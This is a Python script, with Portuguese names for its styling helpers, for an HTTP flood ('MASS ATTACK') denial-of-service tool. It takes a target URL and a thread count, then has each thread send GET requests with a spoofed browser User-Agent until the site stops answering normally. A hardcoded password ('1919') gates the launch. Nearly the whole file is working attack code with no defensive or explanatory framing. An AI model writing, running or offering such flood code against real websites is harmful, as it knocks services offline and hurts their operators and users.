import threading
import requests
import os

class Estilos:
    RESET = '\033[0m'  # Reseta todos os estilos e cores
    BOLD = '\033[1m'  # Torna o texto em negrito
    ITALIC = '\033[3m'  # Torna o texto em itálico
    UNDERLINE = '\033[4m'  # Sublinha o texto


class Cores:
    vermelho = '\033[31m'  # Texto vermelho


def texto_estilizado(texto, estilo):
    return f"{estilo}{texto}{Estilos.RESET}"


def imprimir_texto_estilizado(texto, estilo):
    estilizado = texto_estilizado(texto, estilo)
    print(estilizado)


def titulo(texto=None, estilo=None, aplicar_cores="ambos"):
    if texto is None:
        return
    else:
        texto = str(texto)
        if len(texto) * 2 < 30:
            linha = "-" * 30
            mensagem = f"{texto:^30}"
        else:
            linha = "-" * (len(texto) * 2)
            mensagem = f"{texto:^{len(texto) * 2}}"

        if estilo:
            imprimir_texto_estilizado(linha, estilo)
            imprimir_texto_estilizado(mensagem, estilo)
            imprimir_texto_estilizado(linha, estilo)
        else:
            print(linha)
            print(mensagem)


def launch_attack(url, thread_num):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }

        while True:
            response = requests.get(url, headers=headers)
            if response.status_code != 200:
                print(f"Thread-{thread_num}: Attack completed. The website may be affected.")
                break
            else:
                print(f"Thread-{thread_num}: Attack in progress...")
    except Exception as e:
        print(f"Thread-{thread_num}: An error occurred:", e)


def mass_attack():
    try:
        url = input("Enter the URL of the website you want to mass attack: ")
        num_threads = int(input("Enter the number of threads (more threads can cause more load): "))

        print("\nInitiating mass attack...\n")

        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=launch_attack, args=(url, i + 1))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print("\nMass attack completed.")

    except Exception as e:
        print("An error occurred:", e)


titulo('                    MASS ATTACK                    ', estilo=Cores.vermelho)
senha = str(input('PASSWORD: '))
c = 0
while True:
    if senha == '1919':
        break
    else:
        imprimir_texto_estilizado('WRONG PASSWORD', estilo=Cores.vermelho)
        senha = str(input('TYPE IT AGAIN: '))
        c += 1

if senha == '1919':
    os.system('cls')
    mass_attack()
